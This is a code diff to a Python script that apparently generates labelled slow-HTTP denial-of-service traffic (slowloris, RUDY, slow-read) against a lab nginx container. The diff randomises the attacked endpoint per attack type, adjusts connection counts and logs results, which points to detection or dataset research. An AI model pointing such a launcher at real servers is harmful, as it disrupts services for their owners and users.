@@ -66,6 +66,7 @@ def save_result(event, path="container_results.json"):
         "intensity": event["intensity"],
         "ip": event["ip"],
         "connections": event["connections"],
+        "endpoint": event["endpoint"],
         "start_ts": event["start_ts"],
         "start_dt": safe(event["start_dt"]),
         "end_ts": event.get("end_ts"),
@@ -87,7 +88,7 @@ def save_result(event, path="container_results.json"):
     with open(path, "w") as f:
         json.dump(data, f, indent=2)
 
-def build_command(mode, connections, duration):
+def build_command(mode, connections, duration, attacked_endpoint):
 
     return (
         f"-g -o results "
@@ -95,7 +96,7 @@ def build_command(mode, connections, duration):
         f"-c {connections} "
         f"-x 5 -i 5 -r 3 "
         f"-l {duration} "
-        f"-u http://target_nginx:80/rudy"
+        f"-u http://target_nginx:80{attacked_endpoint}"
     )
 
 
@@ -112,13 +113,22 @@ def launch_attack(attack_type, mode, intensity):
     duration = random.randint(120, 320)
 
     if intensity == "high":
-        connections = random.randint(100, 200)
+        connections = random.randint(70, 90)
     else:
-        connections = random.randint(20, 60)
+        connections = random.randint(10, 40)
 
     ip = allocate_ip()
 
-    command = build_command(mode, connections, duration)
+    endpoints = ["/", "/download", "/rudy", "/slow-read"]
+
+    if attack_type == "slowloris":
+        attacked_endpoint = random.choices(endpoints, [0.85, 0.02, 0.07, 0.06], k=1)[0]
+    elif attack_type == "rudy":
+        attacked_endpoint = random.choices(endpoints, [0.07, 0.02, 0.85, 0.06], k=1)[0]
+    elif attack_type == "slowread":
+        attacked_endpoint = random.choices(endpoints, [0.06, 0.02, 0.07, 0.85], k=1)[0]
+
+    command = build_command(mode, connections, duration, attacked_endpoint)
 
     args = shlex.split(command)
 
@@ -155,6 +165,7 @@ def launch_attack(attack_type, mode, intensity):
         "intensity": intensity,
         "connections": connections,
         "ip": ip,
+        "endpoint": attacked_endpoint,
         "start_ts": start_ts,
         "start_dt": start_dt,
         "end_ts": None,
